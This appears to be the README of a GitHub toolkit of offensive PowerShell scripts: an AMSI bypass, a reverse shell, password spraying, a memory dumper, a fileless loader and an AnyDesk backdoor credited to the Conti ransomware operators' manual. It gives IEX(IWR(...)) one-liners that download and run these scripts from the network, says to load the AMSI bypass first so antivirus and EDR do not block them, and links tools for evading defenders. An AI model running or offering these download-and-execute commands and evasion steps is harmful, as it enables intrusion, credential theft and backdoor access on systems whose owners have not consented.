![logo](https://user-images.githubusercontent.com/69973378/147786741-83944a0f-2ee8-49f7-bdb4-406f0a70ba84.png)

This repo is a collection of minimalist yet effective powershell offensive securities scripts. The goal is to have a very tiny toolkit, enabling a per need basis to allow minimal footprinting (although it is far from perfect and relying only on an AMSI-Bypass will get you caught by EDR once you start doing shady things such as port opening)

All these scripts are made available for educational purposes only. Using them without system owners'consent is illegal and will give you a free jail trip.
They are all provided without warranty and they may or may not break things. You are responsible of the scripts you run.

# usage

All the scripts can be used locally but since we're using powershell and we're trying to be sneaky it is probably better to load them from a webserver using the classic IEX(IWR('https://raw.githubusercontent.com/RaouzRouik/smallposh/main/thescriptyouwant.ps1')) or on your very own webserver if you prefer

You should definitely start by invoking:

IEX(IWR('https://raw.githubusercontent.com/RaouzRouik/smallposh/main/amsibp-dec-2021-fud.ps1'))

or else AV/EDR will surely block you right away!

# opsec/evasion

If you want to pull a sneaky on Blue Team/Soc, you should give a look at the following:

paper:

https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/

tools:

https://github.com/danielbohannon/Invoke-Obfuscation

https://github.com/tokyoneon/Chimera

http://www.powertheshell.com/

https://github.com/klezVirus/inceptor

Of course, for most of the tasks, you don't need to use powershell and you can use signed ms binaries:

https://lolbas-project.github.io/

Also there's a few ways to run powershell without powershell.exe:

https://www.ired.team/offensive-security/code-execution/powershell-without-powershell




# roadmap

Add extra doc on usage

Add a privesc script that will go wmic qfe

Add an eventlogkiller (maybe)




# credits

All credits go to their respective owners:

revshell.ps1:  @TihanyiNorbert based on Nishang Framework

https://github.com/tihanyin/PSSW100AVB

amsibp-dec-2021-fud.ps1: @TihanyiNorbert based on Matt Graeber @mattifestation script

https://github.com/tihanyin/PSSW100AVB

ADspray.ps1, bannergrabber.ps1, smblogin.ps1, portscan-tcp.ps1, portscan-udp.ps1: InfosecMatter 

https://github.com/InfosecMatter/Minimalistic-offensive-security-tools

httpfileserv.ps1: 0v3rride

https://github.com/0v3rride/Simple-PowerShell-HTTP-File-Server

PortFWD.ps1: deepzec

https://github.com/deepzec/Win-PortFwd

minidump.ps1: Matt Graeber @mattifestation

FilelessDotNetLoader.ps1: S3cur3Th1sSh1t

https://github.com/S3cur3Th1sSh1t/Invoke-Sharpcradle

(You should probably give a look at his github, this mans's a powershell beast)


anydesk-backdoor.ps1: Conti Operators Manual (credit is credit)
